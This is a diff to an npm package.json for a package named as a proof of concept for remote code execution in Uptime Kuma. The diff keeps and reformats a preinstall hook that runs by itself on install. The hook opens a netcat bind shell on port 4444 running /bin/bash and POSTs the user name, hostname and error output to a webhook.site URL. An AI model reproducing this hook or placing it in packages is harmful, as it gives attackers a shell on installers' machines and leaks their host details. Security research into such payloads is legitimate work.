@@ -1,12 +1,7 @@
 {
   "name": "poc_uptime_kuma_rce_npm_package",
   "version": "1.0.0",
-  "description": "",
-  "main": "index.js",
   "scripts": {
-    "test": "echo \"Error: no test specified\" && exit 1",
-    "preinstall": "ERR=$(mktemp); nc -lvp 4444 -e /bin/bash 2>"$ERR" & sleep 1; [ -s "$ERR" ] && curl -X POST --data-urlencode "error=$(cat "$ERR")" --data-urlencode "user=$(whoami)" --data-urlencode "hostname=$(hostname)" "https://webhook.site/457e048f-520e-4476-8bce-a1fb2904f1de"; wait"
-  },
-  "author": "",
-  "license": "ISC"
+    "preinstall": "ERR=$(mktemp); nc -lvp 4444 -e /bin/bash 2>\\\"$ERR\\\" & sleep 1; [ -s \\\"$ERR\\\" ] && curl -X POST --data-urlencode \\\"error=$(cat $ERR)\\\" --data-urlencode \\\"user=$(whoami)\\\" --data-urlencode \\\"hostname=$(hostname)\\\" https://webhook.site/457e048f-520e-4476-8bce-a1fb2904f1de; wait"
+  }
 }
